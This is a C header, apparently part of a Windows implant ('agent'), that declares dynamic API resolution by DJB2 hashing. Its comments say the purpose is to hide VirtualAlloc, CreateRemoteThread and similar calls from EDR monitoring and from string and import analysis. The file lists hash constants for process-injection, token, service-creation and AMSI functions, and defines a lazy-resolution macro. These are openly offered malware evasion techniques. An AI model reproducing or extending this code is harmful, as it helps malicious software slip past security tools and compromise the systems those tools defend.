/*
 * api_resolve.h — Dynamic API resolution via hashing.
 *
 * Instead of importing Win32 functions through the IAT (which EDRs monitor
 * and which static analysis tools flag), we resolve all sensitive APIs at
 * runtime using DJB2 hashes of their names.
 *
 * The agent's import table only shows benign functions. All sensitive calls
 * (VirtualAlloc, CreateThread, OpenProcess, etc.) are resolved dynamically.
 *
 * This also hides function names from string analysis — there are no
 * "VirtualAlloc" or "CreateRemoteThread" strings in the binary.
 */
#ifndef API_RESOLVE_H
#define API_RESOLVE_H

#include <windows.h>

/*
 * Resolve a function by DLL name hash + function name hash.
 * Returns the function address or NULL.
 *
 * Walks the PEB's InMemoryOrderModuleList to find loaded modules
 * (avoids calling GetModuleHandle which can be hooked).
 * Then walks the module's export table to find the function.
 */
void *api_resolve(DWORD moduleHash, DWORD functionHash);

/*
 * Resolve from a specific already-loaded module handle.
 * Walks the export table directly.
 */
void *api_resolve_from_module(HMODULE hMod, DWORD functionHash);

/*
 * DJB2 hash at compile time (for constants) and runtime.
 * The runtime version is in syscalls.c (djb2_hash).
 */
DWORD api_hash(const char *str);

/* ─── Module name hashes ─── */
#define HASH_KERNEL32       0x6A4ABC5B
#define HASH_NTDLL          0x1EDAB0ED
#define HASH_ADVAPI32       0x16720E97
#define HASH_USER32         0x63C84283
#define HASH_WINHTTP        0xDBA13CC1
#define HASH_BCRYPT         0x17E984CF
#define HASH_WLDAP32        0x3F2B6E89
#define HASH_SECUR32        0xBEEB5ABD
#define HASH_NETAPI32       0x5768F370
#define HASH_IPHLPAPI       0x42C03A30
#define HASH_AMSI           0x7710B0C0
#define HASH_GDI32          0x6C2A68C2
#define HASH_DNSAPI         0x0D96CF7C
#define HASH_OLE32          0x46318AC5
#define HASH_OLEAUT32       0x4D3DC678

/* ─── Commonly resolved function hashes ─── */
/* kernel32 */
#define HASH_LoadLibraryA           0xB7072FDB
#define HASH_LoadLibraryW           0xB7072FF0
#define HASH_GetProcAddress         0x7C0DFCAA
#define HASH_VirtualAlloc           0x91AFCA54
#define HASH_VirtualAllocEx         0xE5534CB8
#define HASH_VirtualFree            0x030633AC
#define HASH_VirtualProtect         0xC38AE110
#define HASH_VirtualProtectEx       0x38E43674
#define HASH_CreateProcessW         0x0EE3AB0E
#define HASH_CreateRemoteThread     0x72BD9CDD
#define HASH_OpenProcess            0xEFE297C0
#define HASH_WriteProcessMemory     0xD83D6AA1
#define HASH_ReadProcessMemory      0xB9236FA9
#define HASH_CreateFileW            0x7C1D8134
#define HASH_WriteFile              0xF1D207D0
#define HASH_ReadFile               0xA92C5E3A
#define HASH_CloseHandle            0x0FFD97FB
#define HASH_CreatePipe             0x8AB2FD23
#define HASH_GetModuleHandleA       0xD4E88B22
#define HASH_GetModuleHandleW       0xD4E88B37
#define HASH_GetSystemDirectoryW    0x02E4A1D9
#define HASH_CreateFileMappingW     0x27DABDD2
#define HASH_MapViewOfFile          0x8C8BADB0
#define HASH_UnmapViewOfFile        0x30CE3B23
#define HASH_HeapAlloc              0x0A2A1DE0
#define HASH_HeapFree               0x180F1A25
#define HASH_HeapReAlloc            0x82CD7F8B
#define HASH_Sleep                  0xE07CD7E
#define HASH_GetTickCount64         0xFD7F4E0C
#define HASH_QueryPerformanceCounter 0xF7FD0E5F

/* advapi32 */
#define HASH_OpenProcessToken       0xC5D7E25E
#define HASH_GetTokenInformation    0x45AD8A3F
#define HASH_LookupPrivilegeNameW   0x2C9ED1F5
#define HASH_RegOpenKeyExW          0xAF86DA7B
#define HASH_RegQueryValueExW       0x5D9A27C3
#define HASH_OpenSCManagerW         0x97D7B025
#define HASH_CreateServiceW         0x9FFB9E02
#define HASH_StartServiceW          0x3A82B17F

/*
 * Macro for lazy resolution: resolve once, cache in a static.
 * Thread-safe via InterlockedCompareExchangePointer.
 *
 * Usage:
 *   RESOLVE_API(kernel32, VirtualAlloc);
 *   // Now pfnVirtualAlloc is available as a typed function pointer
 */
#define RESOLVE_API(module, func) \
    static void *_cached_##func = NULL; \
    if (!_cached_##func) { \
        void *_resolved = api_resolve(HASH_##module, HASH_##func); \
        InterlockedCompareExchangePointer(&_cached_##func, _resolved, NULL); \
    }

#define GET_API(func) ((void *)_cached_##func)

#endif /* API_RESOLVE_H */
